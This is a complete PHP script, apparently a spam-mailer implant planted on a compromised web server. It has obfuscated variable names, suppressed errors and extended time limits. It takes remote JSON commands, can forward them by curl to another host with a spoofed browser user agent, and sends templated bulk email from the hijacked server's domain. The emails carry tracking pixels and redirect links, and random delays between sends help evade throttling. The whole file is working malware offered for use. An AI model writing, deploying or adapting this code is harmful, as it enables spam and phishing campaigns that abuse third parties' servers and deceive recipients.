<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spd62961) { if ($spd62961 == 'keys') { return array_keys($this->_keys); } } public function Import($spd62961, $sp9fb804) { if (is_array($sp9fb804)) { $this->values[$spd62961] = array(); foreach ($sp9fb804 as $sp0e2a60) { if (!empty($sp0e2a60['key'])) { $this->values[$spd62961][$sp0e2a60['key']] = $sp0e2a60['value']; } else { $this->values[$spd62961][] = $sp0e2a60['value']; } } } else { $this->Assign($spd62961, $sp9fb804); } } public function Assign($spd62961, $spfed2eb) { $this->values[$spd62961] = $spfed2eb; } public function Parse($sp42c7e8) { $sp7e20b7 = ''; $sp5179d8 = 0; while (true) { $sp1282b1 = strpos($sp42c7e8, '{', $sp5179d8); if ($sp1282b1 === false) { $sp7e20b7 .= substr($sp42c7e8, $sp5179d8); break; } $sp7e20b7 .= substr($sp42c7e8, $sp5179d8, $sp1282b1 - $sp5179d8); $sp5179d8 = $sp1282b1 + 1; $sp3b47d4 = ''; $spa7923c = '{'; $sp182046 = array(); $sp83abce = false; $spc8830c = false; $sp9bc98f = 'var'; while ($sp5179d8 < strlen($sp42c7e8)) { $sp902f05 = substr($sp42c7e8, $sp5179d8, 1); $spa7923c .= $sp902f05; if ($sp902f05 == ',' || $sp902f05 == '>' || $sp902f05 == '|') { if ($sp9bc98f == 'alias') { $sp83abce = $sp3b47d4; } elseif ($sp9bc98f == 'mod') { $spc8830c = $sp3b47d4; } else { $sp182046[] = $sp3b47d4; } $sp3b47d4 = ''; if ($sp902f05 == '>') { $sp9bc98f = 'alias'; } if ($sp902f05 == '|') { $sp9bc98f = 'mod'; } $sp5179d8++; continue; } if ($sp902f05 == '}') { if ($sp9bc98f == 'alias') { $sp83abce = $sp3b47d4; } elseif ($sp9bc98f == 'mod') { $spc8830c = $sp3b47d4; } else { $sp182046[] = $sp3b47d4; } $sp5179d8++; break; } $sp3b47d4 .= $sp902f05; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp902f05) == 0) { $sp5179d8++; $sp182046 = array(); break; } $sp5179d8++; } if (sizeof($sp182046) == 0) { $sp7e20b7 .= $spa7923c; continue; } $spdde852 = false; $sp3d92a2 = false; if (preg_match('/^\\^/', $sp182046[0]) > 0) { $sp182046[0] = substr($sp182046[0], 1); $spdde852 = true; } if (preg_match('/^\\!/', $sp182046[0]) > 0) { $sp182046[0] = substr($sp182046[0], 1); $sp3d92a2 = true; } $sp10db80 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp182046[0], $sp464007) > 0) { $sp10db80 = $sp464007[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp182046[0], $sp464007) > 0) { $sp10db80 = explode('-', $sp464007[1]); } if ($sp10db80 !== false) { $sp182046[0] = substr($sp182046[0], 0, strpos($sp182046[0], '[')); } $this->_keys[$sp182046[0]] = true; if (empty($this->values[$sp182046[0]]) && empty($this->fixed[$sp182046[0]])) { continue; } if ($spdde852) { unset($this->fixed[$sp182046[0]]); } if (isset($this->fixed[$sp182046[0]])) { $sp50c9ad = $this->fixed[$sp182046[0]]; } else { $sp50c9ad = ''; $spb81856 = 1; if (sizeof($sp182046) == 2) { $spb81856 = $sp182046[1]; } if (sizeof($sp182046) == 3) { $spb81856 = rand($sp182046[1], $sp182046[2]); } for ($sp3f215e = 0; $sp3f215e < $spb81856; $sp3f215e++) { if (is_array($this->values[$sp182046[0]])) { if (!is_array($this->used[$sp182046[0]])) { $this->used[$sp182046[0]] = array(); } if (count($this->used[$sp182046[0]]) == count($this->values[$sp182046[0]])) { $this->used[$sp182046[0]] = array(); } if ($sp10db80 !== false && is_scalar($sp10db80)) { $sp50c9ad .= $this->values[$sp182046[0]][$sp10db80]; $this->used[$sp10db80] = true; } else { $spbc816c = array(); if (is_array($sp10db80)) { $spf8a414 = $sp10db80[0]; $spfe38ae = $sp10db80[1]; } else { $spf8a414 = 0; $spfe38ae = count($this->values[$sp182046[0]]) - 1; } for ($sp3524d0 = $spf8a414; $sp3524d0 <= $spfe38ae; $sp3524d0++) { if ($sp3d92a2 && !empty($this->used[$sp182046[0]][$sp3524d0])) { continue; } $spbc816c[] = $sp3524d0; } $spbfd716 = $spbc816c[rand(0, count($spbc816c) - 1)]; $this->used[$sp182046[0]][$spbfd716] = true; $sp50c9ad .= $this->values[$sp182046[0]][$spbfd716]; } } else { $sp50c9ad .= $this->values[$sp182046[0]]; } } } $sp50c9ad = $this->Parse($sp50c9ad); if ($spc8830c !== false) { for ($sp6076c1 = 0; $sp6076c1 < strlen($spc8830c); $sp6076c1++) { switch (substr($spc8830c, $sp6076c1, 1)) { case 'b': $sp50c9ad = base64_encode($sp50c9ad); break; case 'q': $sp50c9ad = quoted_printable_encode($sp50c9ad); break; default: break; } } } if ($spdde852) { $this->fixed[$sp182046[0]] = $sp50c9ad; } if ($sp83abce !== false && $sp83abce != '') { $this->fixed[$sp83abce] = $sp50c9ad; } $sp7e20b7 .= $sp50c9ad; } return $sp7e20b7; } } $sp5450fb = file_get_contents('php://input'); $sp023c5d = json_decode($sp5450fb, true); if (empty($sp023c5d['via_proxy'])) { $sp023c5d['via_proxy'] = true; $sp9aa70c = curl_init($sp023c5d['prefix'] . $sp023c5d['files']['s']); $sp501fb3 = json_encode($sp023c5d); curl_setopt($sp9aa70c, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp9aa70c, CURLOPT_TIMEOUT, 600); curl_setopt($sp9aa70c, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp9aa70c, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp9aa70c, CURLOPT_REFERER, $spa2e99a); curl_setopt($sp9aa70c, CURLOPT_POST, true); curl_setopt($sp9aa70c, CURLOPT_POSTFIELDS, $sp501fb3); curl_setopt($sp9aa70c, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp501fb3))); $spc52d35 = curl_exec($sp9aa70c); echo $spc52d35; die; } $sp170a1f = $_SERVER['SERVER_ADDR']; $spd722e5 = $_SERVER['HTTP_HOST']; $spd722e5 = preg_replace('/^www\\./', '', $spd722e5); $sp292aa4 = new Macros(); $sp292aa4->Assign('server_addr', $sp170a1f); $sp292aa4->Assign('server_host', $spd722e5); foreach ($sp023c5d['macros'] as $spd62961 => $sp9fb804) { $sp292aa4->Import($spd62961, $sp9fb804); } $sp01f61e = preg_replace('/^www\\./i', '', $spd722e5); $spf1be7a = $sp292aa4->Parse('{from_user}@' . $sp01f61e); $sp292aa4->Assign('from_email', $spf1be7a); $sp292aa4->Assign('prefix', $sp023c5d['prefix']); $sp292aa4->Assign('html', $sp023c5d['letter']['html']); $sp5179d8 = 0; $sp489bf6 = 0; $sp701a5d = 0; $sp8d02f8 = array(); foreach ($sp023c5d['rcpt'] as $spdfe45f) { $sp292aa4->Assign('email', $spdfe45f['email']); $sp292aa4->Assign('entry', $spdfe45f); $sp292aa4->Assign('date', date('r')); $sp292aa4->Assign('redirect', $sp023c5d['prefix'] . $sp023c5d['files']['r']); $sp292aa4->Assign('redirect_with_uri', $sp023c5d['prefix'] . $sp023c5d['files']['r'] . '?uri='); $sp292aa4->Assign('unsubscribe', $sp023c5d['prefix'] . $sp023c5d['files']['u'] . '?id=' . $spdfe45f['id']); $sp292aa4->Assign('delivery', '<img src="' . $sp023c5d['prefix'] . $sp023c5d['files']['d'] . '?id=' . $spdfe45f['id'] . '" />'); $specb2ad = $sp292aa4->Parse($sp023c5d['envelope']['header']); $sp30ccbc = $sp292aa4->Parse($sp023c5d['envelope']['body']); if (!empty($spdfe45f['name'])) { $sp6b1562 = $spdfe45f['name'] . ' <' . $spdfe45f['email'] . '>'; } else { $sp6b1562 = $spdfe45f['email']; } $spb5e10a = $sp292aa4->Parse($sp023c5d['letter']['subject']); if ($sp5179d8 > 0) { sleep(rand(3, 8)); } $spf467f6 = mail($sp6b1562, $spb5e10a, $sp30ccbc, $specb2ad); $sp8d02f8[$spdfe45f['id']] = $spf467f6; if ($spf467f6) { $sp489bf6++; } else { $sp701a5d++; } $sp5179d8++; } echo serialize(array('total' => count($sp023c5d['rcpt']), 'sent' => $sp5179d8, 'success' => $sp489bf6, 'error' => $sp701a5d, 'rcpt' => $sp8d02f8));